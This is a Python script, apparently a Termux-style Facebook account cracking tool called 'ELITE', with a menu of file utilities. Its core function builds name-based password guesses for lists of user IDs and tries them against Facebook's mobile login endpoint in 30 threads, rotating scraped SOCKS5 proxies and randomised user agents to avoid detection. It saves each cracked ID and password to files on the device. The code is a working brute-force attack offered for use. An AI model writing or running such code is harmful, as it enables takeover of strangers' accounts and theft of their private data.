#!/usr/bin/python3
# -*- coding: utf-8 -*-
try:
	import os,requests,json,time,re,random,sys
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests futures==2 > /dev/null')
	os.system('python elite.py')
ses = requests.Session()
oks=[]
cps=[]
pcp=[]
loop=0

###---[ APPEND ]---###
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, sam, ugen2, ugen, ugen5, redmi = [], [], [], [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0

logo=("""\033[1;37m
       ██████   █████  ██████   █████  
       ██   ██ ██   ██ ██   ██ ██   ██ 
       ██   ██ ███████ ██   ██ ███████ 
       ██   ██ ██   ██ ██   ██ ██   ██ 
       ██████  ██   ██ ██████  ██   ██  


          
\033[47m\033[1;31m TRY     YOUR     BEST \033[41m\033[1;37m YOU    CAN    DO    IT. \x1b[0m
\033[1;37m----------------------------------------------
 Author    : ABDULLAH-D4D4
 Facebook  : JOSSUE CRESPO & ABDULLAH
 Tool Name : ELITE
 Version   : PERSONAL
\033[1;37m----------------------------------------------

\033[1;37m----------------------------------------------""")

def dada():
    
    os.system('clear')
    print(logo)
    print('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] STATUS   :\x1b[1;92mPremium\x1b[1;97m');time.sleep(0.03)
    print('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] VERSION  :\x1b[1;92mELITE1.2\x1b[1;97m  ')         
    print(47*'-')
    print('[01] Crack File')
    print('[02] Dump Create File')
    print('[03] Remove Double Links ')
    print('[04] Cut Use Links From File  ')
    print('[05] Separate Links From File')
    print('[06] Count Lines In Files ')
    print('[07] Make One File From Two Short File  ')
    print('[08] Login Tool')
    print('[09] Logout Cookie  ')
    print(47*'-')
    
    _dada___ = input('\x1b[1;92m[<\>\x1b[1;92m] CHOOSE OPTION : ')
    if _dada___ in ('1', '01'):
        file()
    if _dada___ in ('2', '02'):
       create_file_login()
    if _dada___ in ('3', '03'):
       dubal()
    if _dada___ in ('4', '04'):
       slicer()
    if _dada___ in ('5', '05'):
       separate()
    if _dada___ in ('6', '06'):
        count()
    if _dada___ in ('7', '07'):
        merg()
    if _dada___ in ('8', '08'):
    	login()
    if _dada___ in ('9', '09'):
    	removeu()
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
try:
	clear()
	print(logo)
	print(f'\r\ndumping random ua and proxy please connect vpn')
	try:os.remove('.proxy.txt')
	except:pass
	A = ''
	one = ses.get('https://spys.me/socks.txt').text
	for x in one.splitlines():
		if '+' in x:
			if '.' in x:
				p = x.split(' ')[0]
				A += '\n'+p
	uno = ses.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
	sys.exit(" No internet connection")
for xd in range(1000):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	A = f'Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0','Mozilla/5.0 (Mobile; LYF/F101K/LYF-F101K-000-01-33-120318;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0',
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}'
	C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30'
	memekk = f'{A}{B}{C}'
	ugen.append(memekk)
#
for xd in range(10000):
	a='Mozilla/5.0'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='(Windows NT 6.1;'
	e=random.randrange(100, 9999)
	f='WOW64; rv:54.0)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Gecko/20100101 Firefox/54.0'
	memekk=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(memekk)
#
for xd in range(100):
	android_version = random.choice([str(random.randint(4,7))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9)),'8.0.0','8','9','10','11','12'])
	device_model = random.choice([
		'Mi 9T Pro Build/QKQ1.190825.002; wv',
		'XIAOMI MI MAX 2 Build/NMF26F)',
		'Infinix X680B Build/QP1A.190711.020; wv',
		'RMX1941 Build/PPR1.180610.011; wv',
		'Redmi 4A Build/N2G47H',
		'Redmi 5A Build/N2G47H',
		'LG-UK495 Build/MRA58K; wv',
		'OUJIA 2018-S10MAX Build/MRA58K; wv',
		'vivo 1817 Build/OPM1.171019.026; wv',
		'Andromax B16C2G Build/LMY47V; wv',
		'SM-A127F Build/RP1A.200720.012; wv',
		'TECNO KE5 Build/QP1A.190711.020; wv',
		'M50 STAR Build/NRD90M; wv',
		'SM-N950F Build/PPR1.180610.011; wv',
		'iCherry_C258 Build/iCherryC258; wv',
		'iCherry C251 Build/MRA58K; wv',
		'iCherry C255 Build/MRA58K; wv',
		'C256 Build/iCherry-C256-T03-20180208; wv'
		])
	chrome_version = str(random.randint(76,110))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(0,223))
	memekk = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36'
	ugen.append(memekk)
#
def file():
				clear()
				print(' Put file example:  /sdcard/File.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				plist = []
				print(' Select Password Crack menu');linex();print(' [1] Crack with auto password \n [2] Crack with choice password');linex()
				ppp=input(' Choose: ')
				if ppp in ['1','01']:
					plist.append('first last')
					plist.append('firstkhan')
					plist.append('lastkhan')
					plist.append('last1122')
					plist.append('last1234')
				else:
					try:
						linex()
						ps_limit = int(input(' How many passwords do you want to add ? '))
					except:
						ps_limit =1
					linex()
					print('\033[1;32m exp: first last,firtslast,first123')
					linex()
					for i in range(ps_limit):
						plist.append(input(f' Put password {i+1}: '))
				linex()
				print(' Do you went show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(' Total Ids in File : \033[1;32m'+total_ids+f' ')
					print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						crack_submit.submit(api,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
def api(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        xx = open('.proxy.txt','r').read().splitlines()
                        proxy = {'http': 'socks5://'+random.choice(xx)}
                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ABDULLAH =session.cookies.get_dict().keys()
                        if "c_user" in ABDULLAH:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [SUCES] %s | %s'%(ids,pas))
                                open('/sdcard/ELITE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ABDULLAH:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ELITE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
	
def removeu():
        os.system('rm token.txt cookie.txt');exit('\n\x1b[92m [✓] Logout Successfully')
        login()
        
def count():
    os.system("clear")
    print (logo)
    file_x = input(" [<\>] Put file path :")
    file = open(file_x, "r")
    line_count = 0
    for line in file:
        if line != "\n":
            line_count += 1
    file.close()
    total = str(line_count)
    print(" [<\<] Total Line number : "+total)
    input(" [<\>] Exit :)")
    dada()
    
def merg():
    os.system("clear")
    print (logo)
    f1 = input(" [<\>] Put 1st file Path : ")
    f2 = input(" [<\>] Put 2nd file Path : ")
    output_file = input(" [+] Put output all save file Path : ")
    data = data2 = ""
    with open(f1) as fp:
        data = fp.read()
    with open(f2) as fp:
        data2 = fp.read()
    data += "\n"
    data += data2
    with open (output_file, 'w') as fp:
        fp.write(data)
    print(" [<\>] File merging Complete save in "+output_file)
    dada()
    
def dubal():
    os.system('clear')
    print(logo)
    print(" Enter File Path / File Location \n")
    elite = input(' Put File Name :')
    print(" ")
    abdullah = input(' Saving Put File Name : ')
    os.system('touch ' +abdullah)
    os.system('sort -r '+elite+' | uniq > '+abdullah)
    os.system('clear')
    print(logo)
    print(" Removed Successful From File: " + elite )
    print(" New File Saved:" + abdullah )
    print(47*'-')
    dada()

import os
import re
def slicer():
    os.system("clear")
    print (logo)
    filex = input(" [<\>] Put File Path : ")
    with open(filex, 'r+') as fp:
        s = int(input(' [+] Put  line number : '))
        lines = fp.readlines()
        fp.seek(0)
        fp.truncate()
        fp.writelines(lines[s:])
        print(" [+] Line Slice Compelte back :)")
        dada()
        
def separate():
    os.system('clear')
    print (logo)
    print ('\033[1;37mSeparate Links From File\033[0;97m')
    print (47*'-')
    file_name = input('\033[1;37mInput file name: ')
    print(47*'-')
    if file_name == '':
        main_menu()
    print ('\033[1;32mFor Example /sdcard/elite.txt\033[0;97m')
    print (47*'-')
    new_save = input('\033[1;37mSave New file Name: \033[0;97m')
    if "/sdcard/" not in new_save:
        print ('Put /sdcard/yourfile name.txt')
        time.sleep(2)
        separate()
    elif new_save == '':
        main_menu()
    try:
        limit = int(input('\033[1;32mHow many links do you want to separate? \033[0;97m'))
    except:
        limit = 1
    y = 0
    for y in range(limit):
        y+=1
        links = input('\033[0;97mSelect link %s: '%(y))
        os.system('cat '+file_name+' | grep '+links+' >> '+new_save)
    print(47*'-')
    print('\033[1;37mLinks Separate successfully')
    print('\033[1;32mNew file saved as: /sdcard/'+new_save)
    print(47*'-')
    input('\033[1;32mPress enter to back ')
    dada()
    
dada()